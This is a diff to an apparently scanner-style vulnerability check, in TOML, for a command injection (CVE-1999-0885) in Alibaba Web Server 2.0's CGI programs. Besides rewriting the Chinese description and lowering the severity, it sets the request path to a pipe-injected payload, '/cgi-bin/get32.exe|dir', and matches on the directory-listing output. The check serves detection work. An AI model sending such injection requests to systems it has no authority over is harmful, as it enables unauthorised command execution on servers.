@@ -1,9 +1,9 @@
 [info]
 author = "ave"
-description = "验证 Alibaba 2.0 Web 服务器 CGI 命令执行漏洞，通过向服务器发送包含管道字符（'|'）的畸形 URL 请求实现，攻击者无需身份验证即可在服务器上执行任意操作。"
+description = "Alibaba 2.0 Web 服务器多个 CGI 程序（如 get32.exe、tst.bat）存在命令注入漏洞，攻击者在畸形 URL 中插入管道符（|）即可让服务器将后续内容作为系统命令执行。本 PoC 通过向 /cgi-bin/get32.exe 发送含管道符命令的 HTTP 请求，检测目标是否存在该任意命令执行漏洞。"
 id = "POC-AVE-1999-0677"
-name = "Alibaba Web Server 2.0 CGI Command Injection"
-severity = "critical"
+name = "CVE-1999-0885 Alibaba Web Server 远程命令执行 PoC"
+severity = "high"
 tags = ["ave-1999-0677"]
 vuln_id = [
     "CVE-1999-0885",
@@ -15,7 +15,7 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cgi-bin/get32.exe"
+path = "/cgi-bin/get32.exe|dir"
 protocol = "http"
 
 [poc.requests.headers]
@@ -25,4 +25,7 @@ User-Agent = "AVE/1.0"
 expect = true
 part = "body"
 type = "word"
-words = ["Microsoft Windows"]
+words = [
+    "Volume",
+    "Directory of",
+]
